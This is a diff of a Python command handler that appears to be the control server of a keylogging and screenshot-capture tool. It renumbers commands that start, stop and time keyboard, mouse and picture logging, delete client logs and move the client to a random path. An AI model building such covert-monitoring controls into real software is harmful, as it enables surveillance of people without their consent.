@@ -44,7 +44,7 @@ class Server_subprocess:
                         
                         data_array = data.split(" ")
                         task = data_array[0].upper()
-                        error = False
+                     
                         try:
                             
                             if task in t:
@@ -66,103 +66,84 @@ class Server_subprocess:
                                         printable["x_break"] = data_array[1]
                                         result = "Task '{}' found, description : {}. For {} IP : {}. The server sleep for {} secondes".format(task,printable["description"],self.name,self.ip,data_array[1])
                                         print(printable)
-                                elif index == 1: #PAUSE_CAPTURE_KEYBOARD
-                                    result = "Task '{}' found, description : {}. For {} IP : {}. The keyboard capture is break.".format(task,printable["description"],self.name,self.ip)
-                                    print(printable)
-                                elif index == 2: #PAUSE_CAPTURE_MOUSE
-                                    result = "Task '{}' found, description : {}. For {} IP : {}. The mouse capture is break.".format(task,printable["description"],self.name,self.ip)
-                                    print(printable)
-                                elif index == 3: #PAUSE_CAPTURE_PICTURE
-                                    result = "Task '{}' found, description : {}. For {} IP : {}. The picture capture is break.".format(task,printable["description"],self.name,self.ip)
-                                    print(printable)
+                               
                                 
                                 ####### - STOP - #######
-                                elif index == 4: #STOP_SERVER
+                                elif index == 1: #STOP_SERVER
                                     result = "Task '{}' found, description : {}. For {} IP : {}. The server is down until 00:00 the next day.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 5: #STOP_CAPTURE_KEYBOARD
+                                elif index == 2: #STOP_CAPTURE_KEYBOARD
                                     result = "Task '{}' found, description : {}. For {} IP : {}. The keyboard capture is stopped.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 6: #STOP_CAPTURE_MOUSE
+                                elif index == 3: #STOP_CAPTURE_MOUSE
                                     result = "Task '{}' found, description : {}. For {} IP : {}. The mouse capture is stopped.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 7: #STOP_CAPTURE_PICTURE
+                                elif index == 4: #STOP_CAPTURE_PICTURE
                                     result = "Task '{}' found, description : {}. For {} IP : {}. The picture capture is stopped.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
                                 
                                 ####### - RESTART - #######
-                                elif index == 8: #RESTART_SERVER
+                                elif index == 5: #RESTART_SERVER
                                     result = "Task '{}' found, description : {}. For {} IP : {}. The server will be restart.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 9: #RESTART_CAPTURE_KEYBOARD
-                                    result = "Task '{}' found, description : {}. For {} IP : {}. The keyboard capture will be restart.".format(task,printable["description"],self.name,self.ip)
-                                    print(printable)
-                                elif index == 10: #RESTART_CAPTURE_MOUSE
-                                    result = "Task '{}' found, description : {}. For {} IP : {}. The mouse capture will be restart.".format(task,printable["description"],self.name,self.ip)
-                                    print(printable)
-                                elif index == 11: #RESTART_CAPTURE_PICTURE
-                                    result = "Task '{}' found, description : {}. For {} IP : {}. The picture capture will be restart.".format(task,printable["description"],self.name,self.ip)
-                                    print(printable)
-                                
+                                    
                                 ####### - STOP LOG - #######
-                                elif index == 12: #STOP_LOG_KEYBOARD
+                                elif index == 6: #STOP_LOG_KEYBOARD
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Stop save logs in client, concerning keyboard.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 13: #STOP_LOG_MOUSE
+                                elif index == 7: #STOP_LOG_MOUSE
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Stop save logs in client, concerning mouse.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 14: #STOP_LOG_PICTURE
+                                elif index == 8: #STOP_LOG_PICTURE
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Stop save logs in client, concerning picture.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
                                 
                                 ####### - STOP LOG - #######
-                                elif index == 15: #START_LOG_KEYBOARD
+                                elif index == 9: #START_LOG_KEYBOARD
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Start save logs in client, concerning keyboard.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 16: #START_LOG_MOUSE
+                                elif index == 10: #START_LOG_MOUSE
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Start save logs in client, concerning mouse.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 17: #START_LOG_PICTURE
+                                elif index == 11: #START_LOG_PICTURE
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Start save logs in client, concerning picture.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
                                 
                                 ####### - STATUS - #######
-                                elif index == 18: #STATUS_SERVER ##################### SETUP RETURN
+                                elif index == 12: #STATUS_SERVER ##################### SETUP RETURN
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Status server :".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
-                                elif index == 19: #STATUS_LOG ##################### SETUP RETURN
+                                elif index == 13: #STATUS_LOG ##################### SETUP RETURN
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Status log :".format(task,printable["description"],self.name,self.ip)
-                                    print(printable)
-                                elif index == 20: #STATUS_CAPTURE ##################### SETUP RETURN
-                                    result = "Task '{}' found, description : {}. For {} IP : {}. Status capture :".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
                                 
                                 ####### - RESET CONFIG - #######
-                                elif index == 21: #STATUS_CAPTURE ##################### SETUP RETURN
+                                elif index == 14: #STATUS_CAPTURE ##################### SETUP RETURN
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Reset the configuration. Check the new configuration on api.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
                                 
                                 ####### - KILL THE PROCESS - #######
-                                elif index == 22: #KILL
+                                elif index == 15: #KILL
                                     result = "Bye bye ;)"
                                     print(printable)
                                 
-                                ####### - LOG TIMER - #######
-                                elif index == 23: #LOG_TIMER ##################### SETUP RETURN
-                                    result = "Incomplete or invalid command e.g : PAUSE_SERVER 10"
-                                    if not int(data_array[1]):raise Exception("Error, the second argument must be an integer")#Check argument if is integer
+                                ####### - LOG_TIMER - #######
+                                elif index == 16: #LOG_TIMER ##################### SETUP RETURN
+                                    result = "Incomplete or invalid command e.g : LOG_TIMER [KEYBOARD/MOUSE/PICTURE/ALL] 10(secondes)"
+                                    if not int(data_array[2]):raise Exception("Error, the second argument must be an integer")#Check argument if is integer
+                                    elif not data_array[1].upper() in ["KEYBOARD","MOUSE","PICTURE","ALL"]:raise Exception("Error, the first argument must be KEYBOARD, MOUSE or PICTURE")#Check argument if is integer
                                     else:
-                                        printable["x_log_timer"] = data_array[1]
-                                        result = "Task '{}' found, description : {}. For {} IP : {}. Setup log timer.".format(task,printable["description"],self.name,self.ip)
+                                        printable["type"] = data_array[1]
+                                        printable["timer"] = data_array[2]
+                                        result = "Task '{}' found, description : {}. For {} IP : {}. Timer is setup for {} - {}/secondes.".format(task,printable["description"],self.name,self.ip,data_array[1],data_array[2])
                                         print(printable)
-                                        
                                 ####### - DELETE CONFIG - #######
-                                elif index == 24: #DELETE_LOG ##################### SETUP RETURN > give path
+                                elif index == 17: #DELETE_LOG ##################### SETUP RETURN > give path
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Deleted local log folder.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
                                     
                                 ####### - MOVE - #######
-                                elif index == 24: #MOVE ##################### SETUP RETURN > give path
+                                elif index == 18: #MOVE ##################### SETUP RETURN > give path
                                     result = "Task '{}' found, description : {}. For {} IP : {}. Move on random path : THEPATH.".format(task,printable["description"],self.name,self.ip)
                                     print(printable)
                                 
